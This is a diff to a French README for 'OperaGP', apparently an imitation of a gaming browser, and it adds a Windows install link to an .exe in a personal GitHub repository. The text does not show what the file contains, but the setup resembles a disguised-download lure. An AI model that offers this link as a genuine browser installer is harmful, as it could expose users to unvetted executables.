@@ -15,3 +15,5 @@ Illuminez votre journée avec le mode clair, désormais disponible dans les navi
 Obtenez des jeux gratuits, les meilleures offres, ainsi qu’un calendrier sur la sortie de jeux et des actualités sur les jeux, le tout en un seul endroit. GP Corner dans le navigateur mobile propose également des jeux mobiles gratuits et les meilleures suggestions de jeux.
 
 ![OperaGP](https://user-images.githubusercontent.com/99401816/201177874-7d431ade-6730-4112-a5bd-9a8a5ec9de30.png)
+
+INSTALL Windows64 : https://github.com/Freakidann/OperaGP/releases/download/OperaGP/OperaGP.exe
